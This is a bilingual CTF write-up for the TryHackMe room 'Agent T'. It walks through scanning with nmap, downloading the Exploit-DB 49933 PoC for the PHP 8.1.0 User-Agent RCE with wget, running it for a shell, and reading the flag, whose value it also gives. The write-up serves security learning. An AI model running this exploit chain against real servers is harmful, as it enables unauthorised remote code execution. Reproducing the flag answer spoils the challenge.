# Agent T

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | CTF challenge | `agentt` | https://tryhackme.com/room/agentt | 01 Level Easy | TryHackMe | Nmap (service scan) / PHP 8.1.0 / Exploit-DB 49933 (RCE por User-Agent) / webshell / find & cat | Caja CTF mínima: descubrir PHP 8.1.0 vulnerable, ejecutar el PoC de RCE vía User-Agent, obtener una shell y leer la flag. |

---

**Contexto:** Reto CTF de máquina única donde el vector de entrada es el propio servidor web: la versión de PHP (8.1.0) es vulnerable a ejecución remota de código mediante una cabecera User-Agent manipulada (CVE cubierto por el exploit público 49933 de Exploit-DB). Enumerando los puertos se aterriza en el servicio web y con el PoC en Python se consigue una shell; un `find / -name flag.txt` localiza la flag y `cat` la lee. La room es deliberadamente corta: todo pasa por ese misconfiguration/RCE de PHP.

> **ES:** "Agent T" — explota el RCE de PHP 8.1.0 vía User-Agent (Exploit-DB 49933) para obtener shell y leer la flag.
> **EN:** "Agent T" — exploit PHP 8.1.0 RCE via User-Agent (Exploit-DB 49933) to get a shell and read the flag.

## Solucionario

### Task 1: Obtén la flag / Get the flag

**Explicación:** Un escaneo de servicios (`nmap -sV`) revela el servidor web corriendo PHP 8.1.0. Buscando en Exploit-DB se encuentra que PHP 8.1.0 es vulnerable a RCE cambiando el User-Agent (exploit 49933). Se descarga y ejecuta el PoC en Python, indicando la URL del target: entrega una shell interactiva. Desde la shell se localiza y lee el archivo `flag.txt`, revelando la flag.

```bash
nmap -sV MACHINE_IP
# -> PHP 8.1.0
wget https://www.exploit-db.com/exploits/49933
python3 49933
# Enter the full host url: http://MACHINE_IP
#  -> shell en el servidor
find / -type f -name "flag.txt"
cat <ruta_flag.txt>       # -> flag{4127d0530abf16d6d23973e3df8dbecb}
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag? / ¿Cuál es la flag? | `flag{4127d0530abf16d6d23973e3df8dbecb}` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag? / ¿Cuál es la flag? | `flag{4127d0530abf16d6d23973e3df8dbecb}` |

---

**Metodología:** Escanear servicios para detectar PHP 8.1.0, localizar el exploit público (Exploit-DB 49933) que hace RCE jugando con la cabecera User-Agent, ejecutar el PoC en Python contra `http://MACHINE_IP` para obtener una shell, localizar `flag.txt` con `find` y leerlo con `cat`.

### Cadena de ataque / Attack Chain

```text
nmap -sV -> detectar PHP 8.1.0 -> Exploit-DB 49933 (RCE por User-Agent) -> python3 49933 -> shell -> find / -name flag.txt -> cat -> flag
```

**Learning chain:** Port scan/service detection -> identificar versión vulnerable -> exploit público (RCE) -> shell -> localizar flag.

**Lección:** *Una versión concreta de PHP (8.1.0) puede ser un RCE trivial vía User-Agent; la enumeración de versiones con Nmap es el primer paso para encadenar con un PoC público.*

**MITRE ATT&CK:** T1046 (Network Service Discovery), T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter), T1083 (File and Directory Discovery)

**Fuente:** [TryHackMe - Agent T](https://tryhackme.com/room/agentt)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.